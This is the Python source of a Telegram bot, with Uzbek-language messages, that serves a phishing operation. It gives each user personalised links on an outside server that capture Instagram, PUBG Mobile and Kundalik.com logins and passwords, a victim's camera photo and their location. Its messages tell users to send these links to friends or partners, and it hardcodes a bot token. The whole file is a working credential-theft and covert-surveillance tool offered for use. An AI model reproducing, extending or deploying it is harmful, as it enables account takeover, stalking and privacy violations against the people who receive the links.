from datetime import datetime
from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler
from functools import wraps

BOT_TOKEN = "7760257279:AAGgiolbiVaVv3hB1Dn3TvNGrz45WQq7UM4"
CHANNEL_ID = "@password873"
server="https://xr-team.site"
k = [
    [KeyboardButton("Instagram ❤️ accaunt"), KeyboardButton("PUBG MOBILE 🖤 accaunt"),
     KeyboardButton("Kundalik.com accaunt 😂")],
    [KeyboardButton("Rasmga olish 📸"), KeyboardButton('Lokatsiya olish 🗺')],
    [KeyboardButton("🧬 Tugmali Link Instagram 🌐"), KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"),
     KeyboardButton("🧬 Tugmali Link Kundalik.com 🌐")],

]

def require_subscription(func):
    @wraps(func)
    def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id

        try:
            member = context.bot.get_chat_member(CHANNEL_ID, user_id)
            subscribed = member.status in ["member", "administrator", "creator"]
        except:
            subscribed = False

        if not subscribed:
            buttons = [
                [InlineKeyboardButton("📢 Kanalga obuna bo‘lish", url=f"https://t.me/{CHANNEL_ID.replace('@','')}")],
                [InlineKeyboardButton("🔄 Tekshirish", callback_data="check_sub")]
            ]

            update.message.reply_text(
                "❗ Davom etish uchun avval kanalga obuna bo‘ling!",
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            return

        return func(update, context, *args, **kwargs)
    return wrapper

@require_subscription
def start(update,context):
    id = update.message.from_user.id
    first_name = update.message.from_user.first_name
    last_name = update.message.from_user.last_name
    user_name = update.message.from_user.username
    vaqt = datetime.now()
    context.bot.send_message(
        chat_id="@password873",
        text=f"""
        🆔 ID: {id}
        👤 Ismi: {first_name}
        👥 Familiyasi: {last_name}
        💬 Username: @{user_name}
        ⏰ Vaqt: {vaqt}

        botimga start bosdi
        👍
        """
    )
    text=f"""
     🕊 Assalomu alaykum *{update.message.from_user.first_name}* 🌴\n
    👮🏻‍♀️Bizning botimizga xush kelib 🌿\n
    🤖Bu bot *do'stizni 🫂* yoki *sevgan ❤️* insoningizni \n
    🐬instagram paroli *1 minutda* parolini 🔐 olishingiz mumkin\n
    💯Parolni olish uchun */link* tugmasini ustiga ✅
    """

    reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
    update.message.reply_text(text,parse_mode="Markdown",reply_markup=reply_markup)
@require_subscription
def link(update,context):
    text = f"""
    ➡️ *{server}/link/Nakrutka/3/{update.message.from_user.id}* ⬅️
    \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
    \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
    """
    update.message.reply_text(text, parse_mode="Markdown")
    update.message.reply_text(f"Copy qilish uchun `{server}/link/Nakrutka/3/{update.message.from_user.id}` ni ustiga bos",
                              parse_mode="Markdown")
@require_subscription
def menyu(update,context):

    reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
    update.message.reply_text("📌 *Menyu*",parse_mode="Markdown",reply_markup=reply_markup)

@require_subscription
def help(update,context):
    text=f"""
    🤖Bu bot *do'stizni 🫂* yoki *sevgan ❤️* insoningizni \n
    🐬instagram paroli *1 minutda* parolini 🔐 olishingiz mumkin\n
    💯Parolni olish uchun */link* tugmasini ustiga ✅
    """
    update.message.reply_text(text, parse_mode="Markdown")

@require_subscription
def text(update,context):
    text=update.message.text

    if text=="Instagram ❤️ accaunt":
        with open("img/rasm_1.png", "rb") as photo:
            update.message.reply_photo(photo=photo, caption="1-rasm 📸")
        with open("img/rasm_2.png", "rb") as photo:
            update.message.reply_photo(photo=photo, caption="2-rasm 📸")
        with open("img/rasm_3.png", "rb") as photo:
            update.message.reply_photo(photo=photo, caption="3-rasm 📸")


        k=[
            [KeyboardButton("1-rasm 📸"),KeyboardButton("2-rasm 📸"),KeyboardButton("3-rasm 📸")],
            [KeyboardButton("Ortga ⬅️")]
        ]
        reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
        update.message.reply_text("Qaysi turdagi link (Tafsiya etiladi 3-rasm 📸) ",reply_markup=reply_markup)


    elif text=="1-rasm 📸":
        text=f"""
        ➡️ *{server}/link/Nakrutka/1/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
        """
        update.message.reply_text(text,parse_mode="Markdown")
        update.message.reply_text(f"Copy qilish uchun `{server}/link/Nakrutka/1/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")

    elif text=="2-rasm 📸":
        text=f"""
        ➡️ *{server}/link/Nakrutka/2/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
        """
        update.message.reply_text(text,parse_mode="Markdown")
        update.message.reply_text(f"Copy qilish uchun `{server}/link/Nakrutka/2/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")

    elif text=="3-rasm 📸":
        text=f"""
        ➡️ *{server}/link/Nakrutka/3/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
        """
        update.message.reply_text(text,parse_mode="Markdown")
        update.message.reply_text(f"Copy qilish uchun `{server}/link/Nakrutka/3/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")


    elif text=="🧬 Tugmali Link Instagram 🌐":
        k=[
            [InlineKeyboardButton("🧬",url=f"{server}/link/Nakrutka/{update.message.from_user.id}")]
        ]
        update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
        update.message.reply_text(f"Copy qilish uchun `{server}/link/Nakrutka/3/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")
    elif text=="🧬 Tugmali Link PUBG MOBILE 🌐":
        k=[
            [InlineKeyboardButton("🧬",url=f"{server}/link/Pubg/{update.message.from_user.id}")]
        ]
        update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
        update.message.reply_text(f"Copy qilish uchun `{server}/link/Pubg/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")
    elif text=="🧬 Tugmali Link Kundalik.com 🌐":
        k=[
            [InlineKeyboardButton("🧬",url=f"{server}/eMaktab/login/{update.message.from_user.id}")]
        ]
        update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
        update.message.reply_text(f"Copy qilish uchun `{server}/eMaktab/login{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")


    elif text=="PUBG MOBILE 🖤 accaunt":
        text=f"""
        ➡️ *{server}/link/Pubg/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
        """
        update.message.reply_text(text,parse_mode="Markdown")
        update.message.reply_text(f"Copy qilish uchun `{server}/link/Pubg/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")
    elif text=="Kundalik.com accaunt 😂":
        text=f"""
        ➡️ *{server}/eMaktab/login/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
        """
        update.message.reply_text(text,parse_mode="Markdown")
        update.message.reply_text(f"Copy qilish uchun `{server}/eMaktab/login/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")

    elif text=="Ortga ⬅️":
        k = [
            [KeyboardButton("Instagram ❤️ accaunt"), KeyboardButton("PUBG MOBILE 🖤 accaunt"),KeyboardButton("Kundalik.com accaunt 😂")],
            [KeyboardButton("Rasmga olish 📸"), KeyboardButton('Lokatsiya olish 🗺')],
            [KeyboardButton("🧬 Tugmali Link Instagram 🌐"),KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"), KeyboardButton("🧬 Tugmali Link Kundalik.com 🌐")],
        ]
        reply_markup = ReplyKeyboardMarkup(k, resize_keyboard=True)
        update.message.reply_text("*Menyulardan foydalaning /menyu 🫂*",
                                  parse_mode="Markdown",reply_markup=reply_markup)
    elif text=='Rasmga olish 📸':
        text=f"""
        *Bu bo'lim yangi bo'limlarimizdan ✅*
        
        ➡️ *{server}/camera/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa rasmi sizga keladi 
        
        Eslatma ⚠️
            Rasm kelishi uchun linkga kirgan odam cameraga ruxsat berishi shart ❗️
        """
        update.message.reply_text(text,parse_mode="Markdown")
        update.message.reply_text(f"Copy qilish uchun `{server}/camera/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")
    elif text=='Lokatsiya olish 🗺':
        text = f"""
        *Bu bo'lim yangi bo'limlarimizdan ✅*

        ➡️ *{server}/lat/long/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa lokatsiyasi sizga keladi 
        
        Eslatma ⚠️
            Lokatsiya kelishi uchun linkga kirgan odam lokatsiyaga ruxsat berishi shart ❗️
        """
        update.message.reply_text(text, parse_mode="Markdown")
        update.message.reply_text(f"Copy qilish uchun `{server}/lat/long/{update.message.from_user.id}` ni ustiga bos",
                                  parse_mode="Markdown")

    else:
        k = [
            [KeyboardButton("Instagram ❤️ accaunt"), KeyboardButton("PUBG MOBILE 🖤 accaunt"),KeyboardButton("Kundalik.com accaunt 😂")],
            [KeyboardButton("Rasmga olish 📸"), KeyboardButton('Lokatsiya olish 🗺')],
            [KeyboardButton("🧬 Tugmali Link Instagram 🌐"),KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"), KeyboardButton("🧬 Tugmali Link Kundalik.com 🌐")],

        ]
        reply_markup = ReplyKeyboardMarkup(k, resize_keyboard=True)
        update.message.reply_text("*Menyulardan foydalaning /menyu 🫂*",
                                  parse_mode="Markdown",reply_markup=reply_markup)


def check_sub(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id

    try:
        member = context.bot.get_chat_member(CHANNEL_ID, user_id)
        subscribed = member.status in ["member", "administrator", "creator"]
    except:
        subscribed = False

    if subscribed:
        query.answer("✔ Obuna tasdiqlandi!")
        query.edit_message_text("🎉 Rahmat! Endi botdan foydalanishingiz mumkin.")
    else:
        query.answer("❗ Obuna topilmadi!")
        buttons = [
            [InlineKeyboardButton("📢 Kanalga obuna bo‘lish", url=f"https://t.me/{CHANNEL_ID.replace('@','')}")],
            [InlineKeyboardButton("🔄 Tekshirish", callback_data="check_sub")]
        ]
        query.edit_message_text(
            "❗ Iltimos, avval kanalga obuna bo‘ling!",
            reply_markup=InlineKeyboardMarkup(buttons)
        )



def main():
    updater = Updater(token=BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CommandHandler('link', link))
    dp.add_handler(CommandHandler('menyu', menyu))
    dp.add_handler(CommandHandler('help', help))
    dp.add_handler(MessageHandler(Filters.text,text))
    dp.add_handler(CallbackQueryHandler(check_sub, pattern="check_sub"))

    updater.bot.set_my_commands([
        BotCommand("start", "Botni boshlash"),
        BotCommand("help", "Botni qanday ishlatish qoidalari"),
        BotCommand("menyu", "Buyruqlar"),
        BotCommand("link", "Link olish"),
    ])
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
